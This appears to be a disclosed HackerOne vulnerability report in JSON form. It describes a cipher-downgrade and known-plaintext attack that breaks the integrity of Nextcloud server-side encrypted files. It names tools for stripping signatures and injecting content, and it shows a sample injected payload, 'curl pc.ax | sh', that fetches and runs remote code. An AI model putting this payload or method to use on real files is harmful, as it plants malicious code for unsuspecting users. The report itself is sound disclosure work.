@@ -1,0 +1,136 @@
+{
+  "id": 742588,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NDI1ODg=",
+  "url": "https://hackerone.com/reports/742588",
+  "title": "Downgrade encryption scheme and break integrity through known-plaintext attack",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2019-11-20T19:40:03.765Z",
+  "submitted_at": "2019-11-20T19:40:03.765Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "yahe",
+    "url": "/yahe",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/0lg7nic0d0quts8mwr9b7bqk56rl/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13291,
+    "url": "https://hackerone.com/nextcloud",
+    "handle": "nextcloud",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/tnqlkt8d6fcch8hj8brdjp8nw864/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Nextcloud",
+      "twitter_handle": "nextclouders",
+      "website": "https://nextcloud.com",
+      "about": "Access, share and protect your files, calendars, contacts, communication & more at home and in your enterprise."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2020-8150"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2020-11-05T07:59:44.179Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2020-10-06T07:59:40.090Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "The idea behind the Server Side Encryption is that you can move your encrypted files to an external party without that external party being able to to read or modify those files. Some time ago, Nextcloud switched from unauthenticated CFB cipher block mode to authenticated CTR cipher block mode in an Encrypt-then-MAC scheme. However, backends compatibility has been maintained while downgrade attacks have been prevented on new files that use the CTR cipher block mode [1].\n\nThere is, however, one attack vector that has not been taken into account. CFB/OFB and CTR generate the same keystream for the first round, creating the possibility for a known-plaintext attack to extract the first bytes of the keystream. Furthermore, the downgrade attack only prevents files from not having a \"signature\" (HMAC) when their file header contain a CTR cipher.  A downgrade is still possible when another mode like CFB/OFB is given in the file header.\n\nBecause of these two vulnerabilities, a downgrade attack in conjunction with a known-plaintext attack can be leveraged to break the integrity of files encrypted with Encrypt-then-MAC encryption scheme of Nextcloud using the newer AES-256-CTR cipher.\n\nIn the first step, you need access to an encrypted file (as an external storage provider would have). You do not need access to the encryption keys as this attack is directly mounted on the encrypted file itself. By using a tool (like `strip-signature.php` [2]), you can strip the signature elements from the content block footers and change the cipher in the file header from `AES-256-CTR` to `AES-256-CFB`. Nextcloud will happily decrypt this file, the first 16 bytes will be perfectly readable but the rest of the file will be gibberish.\n\nIn the second step, you need to know what the contents of the file will look like (known-plaintext attack). For Linux binaries this will be relative easy as the ELF file format has a predictable structure will little variation in the first 16 bytes of the file. The same holds true for Linux shell scripts that will probably have `#!/bin/bash\\n` as the first 12 of the 16 bytes preset. The same holds true for Python scripts, which will probably start with something like `#!/usr/bin/env python\\n` providing all the known-plaintext that the attacker will need. If you have enough knowledge about the inital content of the file you can just inject your target content into the encrypted file with the help of a little tool (like `inject-content.php` [3]).\n\nWith these two steps, the attacker successfully broke the integrity guarantees of the Nextcloud Server-Side Encryption and was able to inject malicious code into files that will probably be made executable by a user that has downloaded those files from the Nextcloud server. An injectable payload that fits in those 16 bytes might e.g. be `curl pc.ax | sh\\n` which downloads additional code (without length constraints) from an external source at executes the additional payload.\n\n[1] https://github.com/nextcloud/server/blob/a374d8837d6de459500e619cf608e0721ea14574/apps/encryption/lib/Crypto/Crypt.php#L571\n[2] https://github.com/syseleven/nextcloud-tools/blob/master/strip-signature.php\n[3] https://github.com/syseleven/nextcloud-tools/blob/master/inject-content.php\n\n## Impact\n\nAn attacker that has access to encrypted files that have been encrypted using the newest Encrypt-than-MAC encryption scheme with AES-256-CTR can be downgraded to unauthenticated AES-256-CFB encrypted files. Those downgraded files can then be injected with malicious content in the course of a known-plaintext attack (which is practically feasible as shown with ELF binaries, Python scripts, Bash scripts, etc.). Those injected binaries can then be used to further exploit the user.",
+  "weakness": {
+    "id": 32,
+    "name": "Cryptographic Issues - Generic"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 639638,
+      "file_name": "nextcloud_poc4.mp4",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/ZnPWprhPVJAirKog574RmjPP?response-content-disposition=attachment%3B%20filename%3D%22nextcloud_poc4.mp4%22%3B%20filename%2A%3DUTF-8%27%27nextcloud_poc4.mp4&response-content-type=video%2Fmp4&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQS6SCAH72%2F20240213%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20240213T133206Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDu%2B5Pwo%2F34eoeVeuWsr%2Ff9B54eFSJHpHqs9we%2BjQAH6gIhALp00VqCzQ3yXDicmppc8nMEwhMltHZsqN0RcGzFE1GqKrIFCHUQAxoMMDEzNjE5Mjc0ODQ5Igwkers7f9aKGbx%2BvDcqjwVWDMAhBUKhOq6mxVC7xmKOa%2FU2AiQBQKvDNaKfEmdipLMP6n95LC8VlOQ3Ca%2B7a8IxSNPEW%2FMJrckmzRQkQn5Pvo7LyCxG1l6k7KZzOYPdFRTU7P2FcXBvM6OhRy8ERlHZ1Ufnved4qCHN0953KV512I88RdKF2UQ9KA9EEzg3ey2SzXbnBk2JKsmpPRc0sUDb4ZMn4GDyk%2B2mbDjFILmQt6lr%2B6v0UoAJ%2B7v4%2F%2F852Q6Ruj9P1iez9HOSmDy3175zVvNBeZ4WctM1b8jW6o%2BmI4wZT%2FgWlgSufI1k6yaDWkc%2FE3Bn%2BpLvQoQXU80KrdN1Yr3AjY%2BuRyqxmectMc5y%2Br2%2F%2FwomOAO3I7t5j85rAvGeCLnU1ZAYisFSaSSgAJ%2BfsZD3xX9YCITIgC401%2F5etOaBcdLCaIxhXTp4wk5QS7eRBWvkzPZGEUcM52Rtz1NPZ0uXWarmK9P4ZIqYLWu82nHAH0wf3c3zd07rclVWahRXRkxP0wL3906s66oMXu%2FAgOj02dajNNZpgK8AaMKZXh5LU98RMkHWul32xDirzkDtJ6wBhMOXNHeLLut%2FijTOpDPFtCEBcHCr43hYLb1oSRkvigVVHtwhd%2BDjkszCy1F3hxu7H2ujIa9DoZ20hfrH4QAdqgLvpCC5kvd9Mdm9%2Fx13AdQjdUqxw2uU5HHCcUUMvji7mFcM0YKL33beYGIrXk5AJSUULfcFoq3Vln%2FoLmEL9STeERNxXuI9ijvLiCJCbUpcqNlCitD7ewAHGbNSSxgqcuRKjxMizmXSxM5uuuRQlbl7%2BOU8q4LcVoDIFjj15cH0GRJIGCdM2OT1aQG%2F%2FURgsiaYaysR3DfHV5zWoNx%2FNh%2FdRuvtdIdbsxviMKq0ra4GOrABb%2BYWX5qJazI%2FwiuYHFwT6C%2FymmUklRtb8O7FwtNQp8ZsagCHes2g1O8LOYf5T0%2FOXV0bp7oUjKh25bYYogztfc9XxMWj9SG%2BcrOe8OCs8YNKO4wu1gapV5ceXDZq%2FbF7bPsNEkzubLAYNEzVpO8uqKPZd6oKWBP%2Frue89n87JX%2FKDXf2RuT5sO6X4%2FoVBQryJS%2B7K2SqOzxLHHOKg0mmsmeYRh0fWGzJhtEb%2B0a4xOk%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1976c617051bbe0bf057d7eaca4eb746930b7b4c735c762e4395e0bc0065aa7a",
+      "file_size": 7475178,
+      "type": "video/mp4",
+      "moderated": null
+    }
+  ],
+  "allow_singular_disclosure_at": "2020-11-05T07:59:40.165Z",
+  "allow_singular_disclosure_after": -103267945.86163984,
+  "singular_disclosure_allowed": true,
+  "vote_count": 4,
+  "voters": [
+    "demonia",
+    "carmzy",
+    "helphen",
+    "dilawn"
+  ],
+  "severity": {
+    "rating": "medium",
+    "score": 5.3,
+    "author_type": "User",
+    "metrics": {
+      "attack_vector": "local",
+      "attack_complexity": "high",
+      "privileges_required": "high",
+      "user_interaction": "none",
+      "scope": "changed",
+      "confidentiality": "none",
+      "integrity": "high",
+      "availability": "none"
+    }
+  },
+  "structured_scope": {
+    "databaseId": 13,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "nextcloud/server",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
